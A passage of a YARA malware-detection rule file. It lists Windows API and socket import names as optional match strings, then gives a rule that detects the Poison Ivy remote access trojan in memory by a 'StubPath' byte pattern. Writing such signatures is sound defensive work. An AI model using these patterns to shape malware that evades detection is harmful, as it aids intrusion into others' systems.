$opt87 = "InitializeCriticalSectionEx"
$opt88 = "InitializeSListHead"
$opt89 = "InterlockedIncrement"
$opt90 = "IsBadReadPtr"
$opt91 = "IsBadWritePtr"
$opt92 = "IsProcessorFeaturePresent"
$opt93 = "IsWindowVisible"
$opt94 = "KERNEL32.DLL"
$opt95 = "LeaveCriticalSection"
$opt96 = "LoadCursorA"
$opt97 = "LoadLibraryA"
$opt98 = "LocalAlloc"
$opt99 = "OLEAUT32.DLL"
$opt100 = "OemToCharA"
$opt101 = "OpenMutexA"
$opt102 = "OpenProcess"
$opt103 = "OutputDebugStringW"
$opt104 = "PeekNamedPipe"
$opt105 = "PostQuitMessage"
$opt106 = "QueryPerformanceCounter"
$opt107 = "RegCloseKey"
$opt108 = "RegCreateKeyExA"
$opt109 = "RegOpenKeyExA"
$opt110 = "RegQueryValueExA"
$opt111 = "RegSetValueExA"
$opt112 = "RegisterClassA"
$opt113 = "ReleaseSRWLockExclusive"
$opt114 = "RemoveDirectoryA"
$opt115 = "ResetEvent"
$opt116 = "RtlDllShutdownInProgress"
$opt117 = "SendMessageA"
$opt118 = "SetEntriesInAclA"
$opt119 = "SetFileAttributesA"
$opt120 = "SetFilePointer"
$opt121 = "SetSecurityInfo"
$opt122 = "SetThreadDesktop"
$opt123 = "ShowWindow"
$opt124 = "SleepConditionVariableCS"
$opt125 = "SysAllocString"
$opt126 = "TerminateProcess"
$opt127 = "TerminateThread"
$opt128 = "TranslateMessage"
$opt129 = "USER32.DLL"
$opt130 = "VirtualQuery"
$opt131 = "WININET.DLL"
$opt132 = "WSAGetLastError"
$opt133 = "WSAStartup"
$opt134 = "WaitForSingleObject"
$opt135 = "WaitForSingleObjectEx"
$opt136 = "WakeAllConditionVariable"
$opt137 = "__WSAFDIsSet"
$opt138 = "api-ms-win-core-libraryloader-l1-2-0.dll"
$opt139 = "api-ms-win-core-processthreads-l1-1-0.dll"
$opt140 = "closesocket"
$opt141 = "gethostbyname"
$opt142 = "inappropriate io control operation"
$opt143 = "ioctlsocket"
$opt144 = "read only file system"
$opt145 = "wsock32.dll"

condition:
//require 50% of optional strings
uint16(0) == 0x5A4D and filesize > 300KB and filesize < 99947280947 and 2 of ($req*) and 100 of ($opt*)
}
rule SSC_Win_PoisonIvyW0 {
meta:
author = "Matthew Ulm"
source = "https://github.com/mattulm/sfiles_yara/blob/master/malware/pivy.yar"
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.poison_ivy"
malpedia_version = "20170517"
malpedia_sharing = "TLP:WHITE"
malpedia_license = ""
strings:
// presence of pivy in memory
$a = {00 00 00 00 00 00 00 00 00 00 00 53 74 75 62 50 61 74 68 00}

condition:
any of them
}
